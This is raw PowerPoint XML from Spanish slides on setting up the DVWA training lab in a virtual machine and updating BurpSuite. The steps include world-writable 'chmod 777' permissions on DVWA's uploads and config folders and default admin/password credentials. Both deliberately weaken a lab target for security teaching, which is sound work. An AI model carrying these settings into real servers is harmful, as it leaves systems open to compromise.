              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>uploads</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0">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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 777 /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>config</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0">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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 777 /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="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Ir al enlace: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost/dvwa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0">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Crear una base de datos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="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Conectarse: admin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7B3780D-09C5-24FC-DEE0-935FFB725554}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7093511" y="2601947"/>
            <a:ext cx="4075397" cy="3601040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3316306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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2B9077D-B9E7-1F6C-56B7-2EA1EBC05339}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="605009" y="1064753"/>
            <a:ext cx="10735436" cy="513823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342900" lvl="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Crear una base de datos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0">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endParaRPr lang="es-ES" sz="1800" dirty="0">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endParaRPr lang="es-ES" sz="1800" dirty="0">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endParaRPr lang="es-ES" sz="1800" dirty="0">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Conectarse: admin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Imagen 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8353A55C-3D69-B6A2-F33B-2FC30BA091E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4149511" y="958268"/>
            <a:ext cx="1881175" cy="2087183"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E26E8A97-D570-FC83-7B4B-FA41B26C3EC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6229896" y="1968102"/>
            <a:ext cx="5404044" cy="4607782"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3289750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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual – actualizar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78157BEC-34D7-E788-738C-2D37B6E51B55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6732666" y="936819"/>
            <a:ext cx="4361012" cy="2670697"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{236159A2-44FC-67B7-2DE1-1AA47C462D37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="681087" y="936819"/>
            <a:ext cx="5682006" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Nada más abrir el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> te pide si quieres actualizarlo y te redirige a la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> URL. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Nos descargamos la “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Community</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Edition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>” de Linux</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Imagen 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38EF85AF-E102-CE03-9AFE-E40B4515AC69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="492478" y="2109198"/>
            <a:ext cx="4224676" cy="3811983"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Imagen 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6D37A18-E9A5-555E-A4BF-1CD6D21C7C1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4160972" y="4015189"/>
            <a:ext cx="4827382" cy="1808918"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Imagen 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECA0E558-CE2B-0FEA-274E-96AA66C7D139}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9123172" y="4451020"/>
            <a:ext cx="2946856" cy="1939775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3818375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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual – actualizar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{186DE0B0-B221-66AD-CE16-AE8176BDA27E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="301260" y="913924"/>
            <a:ext cx="6094428" cy="3139321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Instalamos el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> descargado cambiando permisos previamente</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>cd </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Downloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 755 burpsuite_community_linux_v2023_3_2.sh</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ./burpsuite_community_linux_v2023_3_2.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se abre instalador y dejamos las rutas que nos propone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7551943-C12D-D02F-D3C9-DDF5A98EBDAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6157887" y="1355558"/>
            <a:ext cx="5564527" cy="1517011"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7ED319F5-9F89-5A3A-BD0D-D53841184BF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="499620" y="4089494"/>
            <a:ext cx="2686323" cy="2217282"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Imagen 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0C99D6A-EA34-B62A-1C7F-46B0B76AED23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3348474" y="4086241"/>
            <a:ext cx="2703481" cy="2217282"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Imagen 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F1FFB56-FFD5-B358-1BA9-DBB61F9371E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
